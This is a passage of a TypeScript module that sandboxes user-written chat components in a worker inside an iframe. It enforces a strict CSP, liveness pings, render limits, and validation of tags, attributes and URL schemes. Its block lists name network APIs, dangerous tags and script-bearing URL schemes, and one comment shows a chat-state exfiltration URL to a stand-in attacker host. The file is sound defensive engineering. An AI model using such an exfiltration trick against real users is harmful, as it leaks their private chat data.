      post({ type: 'pong', nonce: data.nonce });
      return;
    }
    try {
      if (data.type === 'render') onRender(data);
      else if (data.type === 'event') onEvent(data);
    } catch (error) {
      fail(error);
    }
  };

  // The tests drive these directly, with the very source the worker receives.
  scope.__shizueComponentWorker = {
    compile: compileJsx,
    violations: subsetViolations,
    names: declaredNames,
  };
}

/**
 * Everything below runs in the frame document: our code, and no creator code at
 * all. It owns the DOM, the bridge to the parent, and the worker's life.
 * Self-contained by contract — see the module comment.
 */
function componentFrameRuntime(
  parentOrigin: string,
  workerSource: string,
  limits: RuntimeLimits,
): void {
  'use strict';

  const doc = document;
  const root = doc.getElementById('shizue-root') as Any;
  const labels = { error: 'Component error' };

  // Captured before the hardening below takes them off `window`.
  const later = window.setTimeout.bind(window);
  const cancel = window.clearTimeout.bind(window);
  const every = window.setInterval.bind(window);
  const stopEvery = window.clearInterval.bind(window);

  let port: Any = null;
  let worker: Any = null;
  let workerUrl: string | null = null;
  let budget: Any = null;
  let tree: Any = null;
  let lastHeight = -1;
  let payload: Any = null;
  /** The ping the worker still owes an answer to, and the counter behind it. */
  let pendingNonce: Any = null;
  let nonce = 0;
  /** Trees accepted since the frame last asked for one. */
  let trees = 0;
  /** Open while a turn the reader started is still being answered; see `sendTurn`. */
  let gesture = false;
  let gestureTimer: Any = null;
  /** The idle liveness check; runs only while a worker exists. */
  let heartbeat: Any = null;

  const FIRST_RENDER_MS = 2000;
  const EVENT_MS = 500;
  /**
   * How long a reader's interaction stays good for a `sendTurn`.
   *
   * A turn a component asks for has to be traceable to something the reader did.
   * The rate limit upstairs bounds how many turns can be in flight, but not how
   * many can be started: a component that calls `sendTurn` from an effect posts
   * one on every mount, and the chat re-mounts it after every model turn, so the
   * two of them would talk to each other forever with nobody touching anything.
   * Only an event this frame forwarded opens the window, one send closes it, and
   * it expires on its own — an effect firing outside it is dropped in silence,
   * like every other message the frame does not honour.
   */
  const GESTURE_MS = 1500;
  /** How long the worker has to answer a ping once a tree has been drawn. */
  const PONG_MS = 500;
  /**
   * How often an idle worker is asked whether it is still there.
   *
   * A turn carries its own deadline, so the gap this closes is the quiet stretch
   * *between* turns: a component that answers one ping and then spins holds a
   * worker thread — a whole core, burning battery — until the reader happens to
   * click something, which may be never.
   *
   * Five seconds is chosen from both ends. From below: the cost of being wrong
   * about a live component is one postMessage round trip every five seconds, which
   * is nothing next to the frame the page is already painting, and browsers clamp
   * timers in a hidden tab to about one a minute — so a backgrounded chat asks
   * even less often, and a late tick only means a late question, never a false
   * termination. From above: what is being reclaimed is a spinning core, and that
   * is measured in minutes of battery, so noticing within seconds is already far
   * faster than the harm accrues. Anything much shorter would buy nothing and pay
   * for it on every idle status window on the page.
   */
  const HEARTBEAT_MS = 5000;
  /**
   * Trees one turn may produce. An honest turn posts one per render pass, and the
   * worker stops itself at twenty; a worker posting them in a tight loop would
   * otherwise keep resetting the deadline and keep this thread busy drawing.
   */
  const MAX_TREES_PER_TURN = 32;

  /**
   * Globals this document does not need. No creator code runs in this realm any
   * more, so this is hygiene rather than a boundary — the boundary is that the
   * component runs in a worker, which has no DOM, no navigable location and no
   * WebRTC at all.
   */
  const BLOCKED = [
    'fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'RTCPeerConnection',
    'localStorage', 'sessionStorage', 'indexedDB', 'caches', 'navigator',
    'SharedWorker', 'open',
  ];
  for (let b = 0; b < BLOCKED.length; b += 1) {
    try {
      Object.defineProperty(window, BLOCKED[b] as Any, {
        value: undefined,
        configurable: true,
        writable: true,
      });
    } catch (error) {
      // Non-configurable in this engine; nothing here depends on it.
    }
  }

  /* ------------------------------------------------------------- the bridge */

  function send(message: Any): void {
    if (port) port.postMessage(message);
  }

  function reportHeight(): void {
    const height = Math.ceil(doc.documentElement.getBoundingClientRect().height);
    if (height === lastHeight) return;
    lastHeight = height;
    send({ type: 'resize', height: height });
  }

  /* -------------------------------------------------------- the fallback card */

  function messageOf(error: Any): string {
    return String(error && error.message ? error.message : error);
  }

  function clear(): void {
    tree = null;
    while (root.firstChild) root.removeChild(root.firstChild);
  }

  /** The only thing a reader ever sees go wrong: a small card, never a blank message. */
  function showError(message: Any): void {
    clear();
    const card = doc.createElement('div');
    card.className = 'shizue-fallback';
    const title = doc.createElement('strong');
    title.appendChild(doc.createTextNode(labels.error));
    const detail = doc.createElement('pre');
    // Text nodes only — this document never builds markup from a string.
    detail.appendChild(doc.createTextNode(String(message).slice(0, 500)));
    card.appendChild(title);
    card.appendChild(detail);
    root.appendChild(card);
    reportHeight();
  }

  /* ------------------------------------------------------------- the worker */

  function stopWorker(): void {
    if (heartbeat !== null) stopEvery(heartbeat);
    heartbeat = null;
    if (!worker) return;
    // The only thing that stops a `while (true) {}`.
    worker.terminate();
    worker = null;
  }

  /**
   * Keeps asking, for as long as there is something to ask.
   *
   * A turn already has a deadline, and one running here would be answering a
   * question already on the table — so a tick during a turn does nothing and the
   * next one comes round soon enough. Outside a turn the ping goes out and the
   * ordinary 500ms deadline decides: a worker that has stopped reaching its event
   * loop cannot answer, and `startBudget` terminates it and puts up the same
   * fallback card an overrunning first render gets.
   */
  function startHeartbeat(): void {
    if (heartbeat !== null) return;
    heartbeat = every(function () {
      if (!worker || budget !== null) return;
      expectPong();
    }, HEARTBEAT_MS);
  }

  function clearBudget(): void {
    if (budget !== null) cancel(budget);
    budget = null;
  }

  function startBudget(ms: number): void {
    clearBudget();
    budget = later(function () {
      budget = null;
      stopWorker();
      showError('The component did not answer within ' + ms + 'ms and was stopped.');
    }, ms);
  }

  /** A turn the frame asked for: one deadline, one tree allowance. */
  function startTurn(ms: number): void {
    trees = 0;
    pendingNonce = null;
    startBudget(ms);
  }

  /**
   * Asks the worker to prove it is still answering messages.
   *
   * A tree is *output*, and output proves nothing: a component can post one and
   * then loop forever, and the honest path has the same shape (a tree is posted
   * before effects run). So drawing a tree does not clear the deadline — only a
   * pong carrying the nonce we just sent does.
   */
  function expectPong(): void {
    if (!worker) return;
    nonce += 1;
    pendingNonce = 'p' + nonce;
    worker.postMessage({ type: 'ping', nonce: pendingNonce });
    startBudget(PONG_MS);
  }

  function ensureWorker(): Any {
    if (worker) return worker;
    if (!workerUrl) {
      workerUrl = URL.createObjectURL(new Blob([workerSource], { type: 'text/javascript' }));
    }
    worker = new Worker(workerUrl);
    worker.onmessage = function (event: Any): void {
      onWorkerMessage(event.data);
    };
    worker.onerror = function (event: Any): void {
      clearBudget();
      stopWorker();
      showError(String((event && event.message) || 'The component could not be started.'));
    };
    startHeartbeat();
    return worker;
  }

  function onWorkerMessage(message: Any): void {
    if (!message || typeof message !== 'object') return;
    if (message.type === 'pong') {
      // The only thing that clears a deadline.
      if (pendingNonce !== null && message.nonce === pendingNonce) {
        pendingNonce = null;
        clearBudget();
      }
      return;
    }
    if (message.type === 'tree') {
      trees += 1;
      if (trees > MAX_TREES_PER_TURN) {
        clearBudget();
        stopWorker();
        showError('The component kept re-rendering and was stopped.');
        return;
      }
      try {
        applyTree(message.tree);
      } catch (error) {
        clearBudget();
        stopWorker();
        showError(messageOf(error));
        return;
      }
      reportHeight();
      expectPong();
      return;
    }
    if (message.type === 'error') {
      clearBudget();
      // Terminated, not merely reported: otherwise an error is one more way to
      // clear the deadline and keep running. The next init starts a fresh worker.
      stopWorker();
      showError(message.message);
      return;
    }
    // A suggestion does not end the turn, so the budget keeps running.
    if (message.type === 'suggestInput' && typeof message.text === 'string') {
      send({ type: 'suggestInput', text: message.text.slice(0, limits.turn) });
      return;
    }
    // Neither does a send: the worker is answering a click, and the turn it asks
    // for is the parent's to grant. Re-truncated here because the worker's own
    // truncation is a stranger's arithmetic.
    if (message.type === 'sendTurn' && typeof message.text === 'string') {
      // One send per interaction, and only inside one: see GESTURE_MS.
      if (!gesture) return;
      closeGesture();
      const turn: Any = { type: 'sendTurn', text: message.text.slice(0, limits.turn) };
      if (typeof message.directions === 'string') {
        turn.directions = message.directions.slice(0, limits.directions);
      }
      send(turn);
    }
  }

  function mountPayload(next: Any): void {
    payload = next;
    if (next.labels && typeof next.labels.error === 'string') labels.error = next.labels.error;
    clear();
    try {
      const instance = ensureWorker();
      instance.postMessage({
        type: 'render',
        code: String(next.code || ''),
        name: String(next.name || ''),
        props: next.props || {},
        platform: next.platform || {},
      });
      startTurn(FIRST_RENDER_MS);
    } catch (error) {
      showError(messageOf(error));
    }
  }

  function closeGesture(): void {
    if (gestureTimer !== null) cancel(gestureTimer);
    gestureTimer = null;
    gesture = false;
  }

  /**
   * Events that mean the reader decided something, as opposed to events the
   * browser raises on its own.
   *
   * `mouseenter`/`mouseleave` and `focus`/`blur` are forwarded — a component
   * needs them to draw hover and focus states — but they must not open the
   * window: a node created under a stationary pointer gets `mouseenter` for
   * free, and a component re-inits on every variable change, so a card wiring
   * `sendTurn` to `onMouseEnter` could otherwise take a turn per model reply
   * with the reader never moving.
   */
  const GESTURE_EVENTS: Any = {
    click: 1, dblclick: 1, keydown: 1, keyup: 1,
    mousedown: 1, mouseup: 1, input: 1, change: 1,
  };

  /** The reader did something in this frame, so the next turn may be theirs. */
  function openGesture(): void {
    closeGesture();
    gesture = true;
    gestureTimer = later(closeGesture, GESTURE_MS);
  }

  function sendEvent(path: string, event: string, data: Any): void {
    // A terminated worker is not restarted by a click: the fallback card stands
    // until the parent sends a new init.
    if (!worker) return;
    // Every event that gets here came from the reader — creator code has no DOM
    // to dispatch one with, and the listener list is ours — but only a
    // deliberate one stands in for the reader's intent to speak.
    if (GESTURE_EVENTS[event] === 1) openGesture();
    worker.postMessage({ type: 'event', path: path, event: event, payload: data });
    startTurn(EVENT_MS);
  }

  /* ---------------------------------------------------------- the DOM applier */

  /**
   * The worker is running a stranger's program, so everything it says about the
   * tree is checked here before it touches the DOM: the tag, the attribute names,
   * every url-bearing value, the event names, the style property names, and how
   * much of it there is.
   */
  const FORBIDDEN_TAGS: Any = {
    script: 1, iframe: 1, frame: 1, frameset: 1, object: 1, embed: 1,
    link: 1, meta: 1, base: 1, form: 1, applet: 1, template: 1, slot: 1,
  };
  const TAG_RE = /^[a-z][a-z0-9-]*$/;
  const ATTR_RE = /^[a-zA-Z][a-zA-Z0-9:_-]*$/;
  const STYLE_RE = /^-?[a-z][a-z0-9-]*$/;
  /**
   * Attributes that navigate. A component may not carry any of them, at all.
   *
   * A url is composed, not fetched, so neither `connect-src` nor `img-src` has an
   * opinion about it, and the second-load teardown only fires once the request is
   * already on the wire — by which time `https://attacker/?state=…` has taken the
   * reader's chat state with it. An `<a>` without `href` is styled text, which is
   * all a status window ever needed. A creator who wants a real link writes it in
   * the message text, where Layer 1's sanitizer makes it an ordinary, visible
   * hyperlink.
   */
  const NAVIGATION_ATTRS: Any = {
    href: 1, ping: 1, target: 1, download: 1, formaction: 1, action: 1, 'xlink:href': 1,
  };
  /** Attributes that fetch a resource; CSP governs these, and the scheme is checked. */
  const URL_ATTRS: Any = { src: 1, srcset: 1, poster: 1, cite: 1, background: 1 };
  const EVENTS = [
    'click', 'dblclick', 'input', 'change', 'keydown', 'keyup',
    'focus', 'blur', 'mousedown', 'mouseup', 'mouseenter', 'mouseleave',
  ];
  const MAX_NODES = 5000;
  const MAX_DEPTH = 64;

  const isPlain = (value: Any): boolean =>
    value !== null && typeof value === 'object' && !Array.isArray(value);

  /**
   * Walks the whole incoming tree before a single node is touched: counts it,
   * checks its shape and refuses the tags that are not allowed.
   *
   * Counting creations was not enough — a tree that reuses every existing entry
   * and appends a few thousand fresh children each turn creates few nodes per
   * message and grows the document without bound. What has to be bounded is what
   * the worker asks for, reused nodes included. Refusing malformed shapes here
   * rather than mid-patch also means a bad tree never leaves the document half
   * drawn.
   *
   * A field of the wrong *type* is still a refusal; a field that is merely
   * *missing* is filled in with its empty value, right here, so the patch path
   * below can read `node.attrs` and the rest without asking. A sparse node is not
   * an attack — it is what a hand-written or trimmed tree looks like — and half a
   * document drawn before a `TypeError` would be the worse answer.
   */
  function checkTree(node: Any, depth: number): number {
    if (typeof node === 'string') return 1;
    if (!isPlain(node)) throw new Error('Malformed component output');
    if (depth > MAX_DEPTH) throw new Error('The component nested deeper than ' + MAX_DEPTH);

    if (node.tag !== null && typeof node.tag !== 'string') throw new Error('Malformed component output');
    if (typeof node.tag === 'string') {
      const tag = node.tag.toLowerCase();
      if (!TAG_RE.test(tag) || FORBIDDEN_TAGS[tag]) throw new Error('<' + node.tag + '> is not allowed');
    }
    if (node.attrs === undefined) node.attrs = {};
    else if (!isPlain(node.attrs)) throw new Error('Malformed component output');
    if (node.style === undefined) node.style = {};
    else if (!isPlain(node.style)) throw new Error('Malformed component output');
    if (node.props === undefined) node.props = {};
    else if (!isPlain(node.props)) throw new Error('Malformed component output');
    if (node.on === undefined) node.on = [];
    else if (!Array.isArray(node.on)) throw new Error('Malformed component output');
    if (node.children === undefined) node.children = [];
    else if (!Array.isArray(node.children)) throw new Error('Malformed component output');

    let count = 1;
    for (let i = 0; i < node.children.length; i += 1) {
      count += checkTree(node.children[i], depth + 1);
      if (count > MAX_NODES) throw new Error('The component rendered more than ' + MAX_NODES + ' nodes');
    }
    return count;
  }

  /** Only a plain, non-navigating url may reach an attribute that fetches one. */
  function safeUrl(value: string): boolean {
    // Whitespace and control characters come out first, character by character so
    // that this source stays plain ASCII: `java<TAB>script:` is a scheme too.
    let plain = '';
    for (let i = 0; i < value.length; i += 1) {
      if (value.charCodeAt(i) > 32) plain += value.charAt(i);
    }
    const scheme = plain.toLowerCase();
    if (scheme.indexOf('javascript:') === 0 || scheme.indexOf('data:') === 0) return false;
    if (scheme.indexOf('vbscript:') === 0 || scheme.indexOf('blob:') === 0) return false;
    return true;
  }

  function setAttrs(element: Any, previous: Any, node: Any): void {
    const before = previous || { attrs: {}, style: {}, props: {} };
    for (const gone in before.attrs) if (!(gone in node.attrs)) element.removeAttribute(gone);
    for (const name in node.attrs) {
      if (!ATTR_RE.test(name) || /^on/i.test(name)) continue;
      const lower = name.toLowerCase();
      if (lower === 'style' || NAVIGATION_ATTRS[lower]) continue;
      const value = String(node.attrs[name]);
      if (URL_ATTRS[lower] && !safeUrl(value)) continue;
      element.setAttribute(name, value);
    }

    for (const dropped in before.style) {
      if (!(dropped in node.style)) element.style.removeProperty(dropped);
    }
    for (const property in node.style) {
      if (!STYLE_RE.test(property)) continue;
      element.style.setProperty(property, String(node.style[property]));
    }

    for (const key in node.props) {
      if (key !== 'value' && key !== 'checked') continue;
      if (element[key] !== node.props[key]) element[key] = node.props[key];
    }
  }

  function bindEvents(entry: Any, node: Any): void {
    for (const name in entry.listeners) {
      if (node.on.indexOf(name) === -1) {
        entry.dom.removeEventListener(name, entry.listeners[name]);
        delete entry.listeners[name];
      }
    }
    for (let i = 0; i < node.on.length; i += 1) {
      const name = node.on[i];
      if (EVENTS.indexOf(name) === -1 || entry.listeners[name]) continue;
      const listener = function (event: Any): void {
        const target = (event && event.target) || {};
        sendEvent(entry.node.path, name, {
          value: typeof target.value === 'string' ? target.value : undefined,
          checked: typeof target.checked === 'boolean' ? target.checked : undefined,
          key: typeof event.key === 'string' ? event.key : undefined,
        });
      };
      entry.listeners[name] = listener;
      entry.dom.addEventListener(name, listener);
    }
  }

  function createEntry(node: Any): Any {
    if (typeof node === 'string') {
      return { node: node, dom: doc.createTextNode(node), children: [], listeners: {} };
    }
    let element: Any;
    if (node.tag === null) {
      // A fragment: invisible to layout, so the applier can keep one node per entry.
      element = doc.createElement('div');
      element.style.display = 'contents';
    } else {
      // Already checked by `checkTree`; the lowercasing is what createElement gets.
      element = doc.createElement(String(node.tag).toLowerCase());
    }

    const entry: Any = { node: node, dom: element, children: [], listeners: {} };
    if (node.tag !== null) {
      setAttrs(element, null, node);
      bindEvents(entry, node);
    }
    entry.children = patchChildren(element, [], node.children || []);
    return entry;
  }

  function sameKind(entry: Any, node: Any): boolean {
    if (typeof node === 'string') return typeof entry.node === 'string';
    if (typeof entry.node === 'string' || !node || typeof node !== 'object') return false;
    return entry.node.tag === node.tag && (entry.node.key || null) === (node.key || null);
  }

  function patchEntry(entry: Any, node: Any): void {
    const previous = entry.node;
    entry.node = node;
    if (typeof node === 'string') {
      if (previous !== node) entry.dom.nodeValue = node;
      return;
    }
    if (node.tag !== null) {
      setAttrs(entry.dom, previous, node);
      bindEvents(entry, node);
    }
    entry.children = patchChildren(entry.dom, entry.children, node.children || []);
  }

  /** Positional, with `key` only forcing a remount — the same rule as before. */
  function patchChildren(parent: Any, entries: Any[], nodes: Any[]): Any[] {
    const next: Any[] = [];
    for (let i = 0; i < nodes.length; i += 1) {
      const existing = entries[i];
      if (existing && sameKind(existing, nodes[i])) {
        patchEntry(existing, nodes[i]);
        next.push(existing);
        continue;
      }
      const created = createEntry(nodes[i]);
      if (existing) parent.replaceChild(created.dom, existing.dom);
      else parent.appendChild(created.dom);
      next.push(created);
    }
    for (let j = nodes.length; j < entries.length; j += 1) parent.removeChild(entries[j].dom);
    return next;
  }

  function applyTree(next: Any): void {
    if (next === null || next === undefined) {
      clear();
      return;
    }
    // Nothing is drawn until the whole of it has been counted and checked.
    checkTree(next, 0);
    if (tree && sameKind(tree, next)) {
      patchEntry(tree, next);
      return;
    }
    const created = createEntry(next);
    while (root.firstChild) root.removeChild(root.firstChild);
    root.appendChild(created.dom);
    tree = created;
  }

  /* -------------------------------------------------------------- handshake */

  /**
   * The handshake, and the only thing that ever crosses the window channel.
   *
   * The frame's origin is opaque, so there is no origin to compare: identity of
   * the sending window is the only check that means anything on the way in. It is
   * accepted once, and it happens here — before any worker exists — so the port
   * belongs to this document alone.
   */
  window.addEventListener('message', function (event: Any): void {
    if (event.source !== window.parent || port) return;
    const data = event.data;
    if (!data || data.type !== 'port' || !event.ports || !event.ports[0]) return;
    port = event.ports[0];
    port.onmessage = function (message: Any): void {
      const init = message.data;
      if (!init || init.type !== 'init') return;
      mountPayload(init);
    };
  });

  // The parent's origin is known and inlined, so the one window message we send
  // is addressed rather than broadcast.
  window.parent.postMessage({ type: 'ready' }, parentOrigin);

  if (typeof ResizeObserver === 'function') {
    new ResizeObserver(function () {
      reportHeight();
    }).observe(doc.documentElement);
  }

  // The tests drive these directly, with the very source the frame receives.
  (window as Any).__shizueComponentFrame = {
    mount: mountPayload,
    apply: applyTree,
    stop: stopWorker,
    payload: function () {
      return payload;
    },
  };
}
/* eslint-enable */

/** Base style of the frame document, matching the shizue reading surface. */
const FRAME_STYLE = `
:root { color-scheme: light; }
html, body { margin: 0; padding: 0; background: transparent; }
body {
  font: 14px/1.6 ui-sans-serif, system-ui, -apple-system, 'Apple SD Gothic Neo',
    'Hiragino Sans', 'Noto Sans KR', 'Noto Sans JP', 'Segoe UI', sans-serif;
  color: #10302b;
  overflow: hidden;
}
img { max-width: 100%; }
.shizue-fallback {
  border: 1px solid rgba(224, 112, 95, 0.4);
  background: rgba(224, 112, 95, 0.08);
  border-radius: 10px;
  padding: 8px 12px;
  font-size: 12px;
  color: #b43e35;
}
.shizue-fallback pre {
  margin: 4px 0 0;
  white-space: pre-wrap;
  overflow-wrap: anywhere;
  font-size: 11px;
  color: #50645b;
}
`;

/** Origins we are willing to name in a CSP. Anything else gets no image source at all. */
const ORIGIN_RE = /^https?:\/\/[A-Za-z0-9.[\]-]+(?::\d+)?$/;

/**
 * The frame's policy. `default-src 'none'` means the document may do nothing at
 * all except what is listed: run its own inline script, apply its own inline
 * style, load images from us, and start a worker from a blob it built itself. No
 * `connect-src`, so there is no network — in the frame or in the worker, which
 * inherits this policy; no `frame-src`, so it cannot nest another frame; no
 * `form-action`, so it cannot post anywhere.
 *
 * `'unsafe-eval'` is here because compiling the creator's JSX *inside* the sandbox
 * is the requirement this whole design turns on, and the compiled module can only
 * be brought to life with `new Function` — Babel-standalone-in-an-iframe would
 * need it for exactly the same reason. It is also the one relaxation that grants
 * nothing: creator JavaScript is the point, and it now runs in a worker with no
 * DOM, no navigable location, no WebRTC and no network.
 */
export function componentFrameCsp(origin: string): string {
  const images = ORIGIN_RE.test(origin) ? `${origin} data:` : 'data:';
  return [
    "default-src 'none'",
    "script-src 'unsafe-inline' 'unsafe-eval'",
    "style-src 'unsafe-inline'",
    `img-src ${images}`,
    "connect-src 'none'",
    "form-action 'none'",
    "frame-src 'none'",
    'worker-src blob:',
  ].join('; ');
}

/**
 * The serialized runtimes leave this module as `toString()` text and run where
 * no module scope exists, so any bundler helper the dev compiler smuggles into
 * their bodies is a `ReferenceError` at the sandbox's first breath — and the
 * symptom is a blank frame, nowhere near the cause. React Refresh has done it
 * once already (a `use*` callee inside `useCallback`). Named here so the
 * failure happens at serialization, loudly, pointing at the contract.
 */
const BUNDLER_TOKEN = /__turbopack_context__|__webpack_require__|\brequire\(/;
function selfContained(source: string, name: string): string {
  const hit = BUNDLER_TOKEN.exec(source);
  if (hit) {
    throw new Error(
      `${name} is no longer self-contained: the compiled source references ` +
        `\`${hit[0]}\`, which does not exist inside the sandbox. The dev ` +
        `compiler instrumented it — keep \`use*\` callee names out of the ` +
        `runtime bodies (componentRuntime.ts says how).`,
    );
  }
  return source;
}

/**
 * The worker as the frame builds it. `scope` names the global the runtime binds
 * to: `self` in a real worker, and a stand-in when a test drives the same source
 * in a realm that has no workers.
 */
export function componentWorkerSource(scope = 'self'): string {
  const runtime = selfContained(componentWorkerRuntime.toString(), 'componentWorkerRuntime');
  return `(${runtime})(${scope},${JSON.stringify(LIMITS)});`;
}

/**
 * The frame runtime as the srcdoc receives it, with the worker inlined in it. Both
 * realms get the same caps, interpolated from `@shizue/core` — the worker's are
 * already in the source the frame is handed.
 */
export function componentRuntimeSource(origin: string): string {
  const runtime = selfContained(componentFrameRuntime.toString(), 'componentFrameRuntime');
  return `(${runtime})(${JSON.stringify(origin)},${JSON.stringify(
    componentWorkerSource(),
  )},${JSON.stringify(LIMITS)});`;
}

/**
 * The whole frame document. It carries no creator code — the code, the props and
 * the platform state arrive over the bridge — so one document serves every
 * component on the page and the browser can reuse the parse.
 */
export function componentFrameSrcdoc(origin: string): string {
  const script = componentRuntimeSource(origin).replace(/<\/(script)/gi, '<\\/$1');
  return [
    '<!doctype html><html><head><meta charset="utf-8">',
    `<meta http-equiv="Content-Security-Policy" content="${componentFrameCsp(origin)}">`,
    `<style>${FRAME_STYLE}</style></head>`,
    '<body><div id="shizue-root"></div>',
    `<script>${script}</script>`,
    '</body></html>',
  ].join('');
}
